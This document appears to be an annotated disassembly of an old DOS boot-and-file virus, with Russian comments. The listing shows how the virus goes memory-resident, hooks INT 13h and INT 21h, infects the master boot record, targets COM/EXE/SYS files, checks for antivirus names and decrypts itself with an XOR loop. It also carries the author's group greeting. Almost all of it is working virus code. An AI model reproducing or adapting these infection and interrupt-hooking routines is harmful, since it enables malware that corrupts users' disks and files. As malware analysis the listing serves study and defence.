20ED:0E25 89E8           MOV    AX,BP
20ED:0E27 48             DEC    AX
20ED:0E28 8ED8           MOV    DS,AX
20ED:0E2A 803E00005A     CMP    [0000],5A       ; Наш блок последний?
20ED:0E2F 7409           JZ     0E3A            ; Да.
;------------------------------------
;       Ищем последний блок...
;____________________________________
20ED:0E31 8BD8           MOV    BX,AX
20ED:0E33 03060300       ADD    AX,[0003]
20ED:0E37 40             INC    AX
20ED:0E38 EBEE           JMP    0E28

;------------------------------------

20ED:0E3A 813E0300800C   CMP    [0003],0C80
20ED:0E40 7303           JNC    0E45        ; Блок не меньше С80h x 16 байт?
20ED:0E42 8EDB           MOV    DS,BX       ; Ecли меньше, то взять пред-
20ED:0E44 93             XCHG   AX,BX       ; последний блок.

20ED:0E45 812E03004001   SUB    [0003],0140 ; Уменьшить на 140h x 16
20ED:0E4B 03060300       ADD    AX,[0003]
20ED:0E4F 40             INC    AX
20ED:0E50 A31200         MOV    [0012],AX   ; Корректируем значение сегмента
                                            ; максимального доступного
                                            ; параграфа в PSP. Но это глюк!
                                            ; Если взяли предпоследний блок,
                                            ; то не попадем в PSP !!!!!!!!!

20ED:0E53 8EC0           MOV    ES,AX           ; Сегмент для вируса.
20ED:0E55 0E             PUSH   CS
20ED:0E56 1F             POP    DS
20ED:0E57 33FF           XOR    DI,DI
20ED:0E59 B9BB07         MOV    CX,07BB
20ED:0E5C FC             CLD
20ED:0E5D F3A4           REP    MOVSB           ; Переезджаем...

20ED:0E5F 06             PUSH   ES
20ED:0E60 B89505         MOV    AX,0595
20ED:0E63 50             PUSH   AX
20ED:0E64 CB             RET    Far             ; Отдаем управление вирусу в
                                                ; памяти по смещению 0595h
                                                ; (соответствует 0E65h)

20ED:0E65 B87000         MOV    AX,0070
20ED:0E68 8ED8           MOV    DS,AX
20ED:0E6A BE0200         MOV    SI,0002
20ED:0E6D 4E             DEC    SI
20ED:0E6E 742B           JZ     0E9B

20ED:0E70 AD             LODSW
20ED:0E71 3DFF1E         CMP    AX,1EFF
20ED:0E74 75F7           JNZ    0E6D
20ED:0E76 B8CA02         MOV    AX,02CA
20ED:0E79 394404         CMP    [SI+04],AX
20ED:0E7C 740B           JZ     0E89
20ED:0E7E 394405         CMP    [SI+05],AX
20ED:0E81 7406           JZ     0E89
20ED:0E83 813CB400       CMP    [SI],00B4
20ED:0E87 75E4           JNZ    0E6D
20ED:0E89 AD             LODSW
20ED:0E8A 96             XCHG   AX,SI
20ED:0E8B 56             PUSH   SI
20ED:0E8C BFC607         MOV    DI,07C6
20ED:0E8F A5             MOVSW
20ED:0E90 A5             MOVSW
20ED:0E91 5E             POP    SI
20ED:0E92 C704B700       MOV    [SI],00B7
20ED:0E96 8C4C02         MOV    [SI+02],CS
20ED:0E99 EB03           JMP    0E9E

20ED:0E9B E84D00         CALL   0EEB    ; Установить INT 13h
20ED:0E9E 0E             PUSH   CS
20ED:0E9F 1F             POP    DS
20ED:0EA0 E814FE         CALL   0CB7    ; Проверка MBR и его заражение

20ED:0EA3 33C0           XOR    AX,AX
20ED:0EA5 8ED8           MOV    DS,AX
20ED:0EA7 E85200         CALL   0EFC    ; Перехват INT 21h
20ED:0EAA 0E             PUSH   CS
20ED:0EAB 1F             POP    DS
20ED:0EAC C3             RET

20ED:0EAD 050A00         ADD    AX,000A
20ED:0EB0 A30E00         MOV    [000E],AX
20ED:0EB3 E8DDFB         CALL   0A93
20ED:0EB6 33C0           XOR    AX,AX
20ED:0EB8 CD1A           INT    1A
20ED:0EBA 92             XCHG   AX,DX
20ED:0EBB A3AF07         MOV    [07AF],AX
20ED:0EBE 257F00         AND    AX,007F
20ED:0EC1 A21700         MOV    [0017],AL
20ED:0EC4 D1E0           SHL    AX,1
20ED:0EC6 D1E0           SHL    AX,1
20ED:0EC8 A30500         MOV    [0005],AX
20ED:0ECB E84E00         CALL   0F1C
20ED:0ECE 33F6           XOR    SI,SI
20ED:0ED0 B9BB07         MOV    CX,07BB
20ED:0ED3 51             PUSH   CX
20ED:0ED4 BF680A         MOV    DI,0A68
20ED:0ED7 57             PUSH   DI
20ED:0ED8 F3A4           REP    MOVSB
20ED:0EDA BE850A         MOV    SI,0A85
20ED:0EDD E89B01         CALL   107B
20ED:0EE0 B440           MOV    AH,40
20ED:0EE2 5A             POP    DX
20ED:0EE3 59             POP    CX
20ED:0EE4 E8B8FB         CALL   0A9F
20ED:0EE7 E8A9FB         CALL   0A93
20ED:0EEA C3             RET

;---------------------------------------------
;         Запоминает INT 13h
;         и устанавливает свой обработчик
;---------------------------------------------
20ED:0EEB BFC607         MOV    DI,07C6
20ED:0EEE B8B700         MOV    AX,00B7
20ED:0EF1 BE4C00         MOV    SI,004C
20ED:0EF4 33D2           XOR    DX,DX
20ED:0EF6 8EDA           MOV    DS,DX
20ED:0EF8 E80E00         CALL   0F09    ; Процедура установки прерывания
20ED:0EFB C3             RET

;---------------------------------------------
;    Запоминает и перехватывает INT 21h
;---------------------------------------------
20ED:0EFC BE8400         MOV    SI,0084
20ED:0EFF BFCA07         MOV    DI,07CA
20ED:0F02 B87A01         MOV    AX,017A
20ED:0F05 E80100         CALL   0F09
20ED:0F08 C3             RET

;--------------------------------------
;       Установка прерывания.
;       Правда круто?
;--------------------------------------
20ED:0F09 B90200         MOV    CX,0002
20ED:0F0C 8704           XCHG   AX,[SI]
20ED:0F0E AB             STOSW
20ED:0F0F AD             LODSW
20ED:0F10 8CC8           MOV    AX,CS
20ED:0F12 E2F8           LOOP   0F0C
20ED:0F14 C3             RET

;--------------------------------------
;       Вызов INT 13h
;--------------------------------------
20ED:0F15 9C             PUSHF
20ED:0F16 2EFF1EC607     CALL   Far CS:[07C6]
20ED:0F1B C3             RET

20ED:0F1C 51             PUSH   CX
20ED:0F1D 56             PUSH   SI
20ED:0F1E BE7C07         MOV    SI,077C
20ED:0F21 B90100         MOV    CX,0001
20ED:0F24 803C39         CMP    [SI],39
20ED:0F27 721F           JC     0F48
20ED:0F29 4E             DEC    SI
20ED:0F2A 41             INC    CX
20ED:0F2B 803C39         CMP    [SI],39
20ED:0F2E 74F9           JZ     0F29
20ED:0F30 49             DEC    CX
20ED:0F31 81FE7507       CMP    SI,0775
20ED:0F35 7309           JNC    0F40
20ED:0F37 BE7C07         MOV    SI,077C
20ED:0F3A 56             PUSH   SI
20ED:0F3B BE7407         MOV    SI,0774
20ED:0F3E EB01           JMP    0F41
20ED:0F40 56             PUSH   SI
20ED:0F41 46             INC    SI
20ED:0F42 C60430         MOV    [SI],30
20ED:0F45 E2FA           LOOP   0F41
20ED:0F47 5E             POP    SI
20ED:0F48 FE04           INC    B/[SI]
20ED:0F4A 5E             POP    SI
20ED:0F4B 59             POP    CX
20ED:0F4C C3             RET

;----------------------------------------
;       Просто сохраняем регистры...
;----------------------------------------
20ED:0F4D 2E8F06BE07     POP    CS:[07BE]
20ED:0F52 9C             PUSHF
20ED:0F53 50             PUSH   AX
20ED:0F54 53             PUSH   BX
20ED:0F55 51             PUSH   CX
20ED:0F56 52             PUSH   DX
20ED:0F57 56             PUSH   SI
20ED:0F58 57             PUSH   DI
20ED:0F59 1E             PUSH   DS
20ED:0F5A 06             PUSH   ES
20ED:0F5B 55             PUSH   BP
20ED:0F5C 2EFF26BE07     JMP    CS:[07BE]

;----------------------------------------
; Также просто их восстанавливаем...
;----------------------------------------
20ED:0F61 2E8F06BE07     POP    CS:[07BE]
20ED:0F66 5D             POP    BP
20ED:0F67 07             POP    ES
20ED:0F68 1F             POP    DS
20ED:0F69 5F             POP    DI
20ED:0F6A 5E             POP    SI
20ED:0F6B 5A             POP    DX
20ED:0F6C 59             POP    CX
20ED:0F6D 5B             POP    BX
20ED:0F6E 58             POP    AX
20ED:0F6F 9D             POPF
20ED:0F70 2EFF26BE07     JMP    CS:[07BE]

20ED:0F75 0E             PUSH   CS
20ED:0F76 1F             POP    DS
20ED:0F77 0E             PUSH   CS
20ED:0F78 07             POP    ES
20ED:0F79 C3             RET

20ED:0F7A EB02           JMP    0F7E
20ED:0F7C CE             INTO
20ED:0F7D A7             CMPSW          ; Метка - сектор заражен.
20ED:0F7E FA             CLI
20ED:0F7F 33C0           XOR    AX,AX
20ED:0F81 8ED0           MOV    SS,AX
20ED:0F83 BC007C         MOV    SP,7C00
20ED:0F86 FB             STI
20ED:0F87 8ED8           MOV    DS,AX
20ED:0F89 B90900         MOV    CX,0009
20ED:0F8C BA8000         MOV    DX,0080
20ED:0F8F 52             PUSH   DX
20ED:0F90 51             PUSH   CX
20ED:0F91 E82100         CALL   0FB5
20ED:0F94 7419           JZ     0FAF
20ED:0F96 BE1204         MOV    SI,0412
20ED:0F99 834401FB       ADD    [SI+01],FFFB
20ED:0F9D AC             LODSB
20ED:0F9E AD             LODSW
20ED:0F9F B106           MOV    CL,06
20ED:0FA1 D3E0           SHL    AX,CL
20ED:0FA3 8EC0           MOV    ES,AX
20ED:0FA5 33DB           XOR    BX,BX
20ED:0FA7 B80402         MOV    AX,0204
20ED:0FAA 59             POP    CX
20ED:0FAB 51             PUSH   CX
20ED:0FAC 41             INC    CX
20ED:0FAD CD13           INT    13
20ED:0FAF 06             PUSH   ES
20ED:0FB0 B8EF06         MOV    AX,06EF
20ED:0FB3 50             PUSH   AX
20ED:0FB4 CB             RET    Far


20ED:0FB5 B8CEA7         MOV    AX,A7CE
20ED:0FB8 CD13           INT    13
20ED:0FBA 81F3CEA7       XOR    BX,A7CE        ; Есть ли в памяти моя копия ?
20ED:0FBE C3             RET

20ED:0FBF E8F3FF         CALL   0FB5
20ED:0FC2 741E           JZ     0FE2
20ED:0FC4 BFC207         MOV    DI,07C2
20ED:0FC7 B84F01         MOV    AX,014F
20ED:0FCA E824FF         CALL   0EF1
20ED:0FCD E81BFF         CALL   0EEB
20ED:0FD0 BE8400         MOV    SI,0084
20ED:0FD3 A5             MOVSW
20ED:0FD4 A5             MOVSW
20ED:0FD5 E89DFF         CALL   0F75
20ED:0FD8 803E420701     CMP    [0742],01
20ED:0FDD 7403           JZ     0FE2
20ED:0FDF E8D5FC         CALL   0CB7
20ED:0FE2 33C0           XOR    AX,AX
20ED:0FE4 8EC0           MOV    ES,AX
20ED:0FE6 59             POP    CX
20ED:0FE7 5A             POP    DX
20ED:0FE8 BB007C         MOV    BX,7C00
20ED:0FEB 06             PUSH   ES
20ED:0FEC 53             PUSH   BX
20ED:0FED B80102         MOV    AX,0201
20ED:0FF0 CD13           INT    13
20ED:0FF2 CB             RET    Far

20ED:0FF3 C3 90 90       ;      First tree bytes of infected .COM

20ED:0FF6 0010002503

20ED:0FFB                Db     'COMEXEBINOVLSYS'

20ED:100A                Db     'SCCLVSF-'
20ED:1012 0100

20ED:1014                Db     '[1984] bY [TДLФN<',04,'>NЦKФ] '
                         Db     ''','93! THiS iZ iNFECTI0N '
                         Db     '#00000108! Greetz RS/NuKE!'

20ED:105E 58             POP    AX           ; Адрес возврата из прерывания

20ED:105F                ADD    SP,0006      ; Освободить стек

20ED:1062                DEC    W/[SI+2]     ; Подправить вектор 4Сh, чтобы
20ED:1065                ADD    [SI],0792    ; он указывал на СS:106C

20ED:1069 E87AF8         CALL   08E6         ; Передать управление на 106С

20ED:106C 83C408         ADD    SP,0008      ; Освободить стек

;-----------------------------------------------
;       Восстановить вектор 4Сh
;-----------------------------------------------
20ED:106F 8F4402         POP    [SI+02]
20ED:1072 8F04           POP    [SI]
;-----------------------------------------------
;       Расшифровка кода с адреса CS:8ED
;           и возврат из процедурки.
;-----------------------------------------------
20ED:1074 051000         ADD    AX,0010
20ED:1077 96             XCHG   AX,SI
20ED:1078 56             PUSH   SI
20ED:1079 0E             PUSH   CS
20ED:107A 1F             POP    DS
20ED:107B B97007         MOV    CX,0770
20ED:107E B84CC1         MOV    AX,C14C
20ED:1081 2E3104         XOR    CS:[SI],AX
20ED:1084 46             INC    SI
20ED:1085 FECC           DEC    AH
20ED:1087 40             INC    AX
20ED:1088 E2F7           LOOP   1081

20ED:108A C3             RET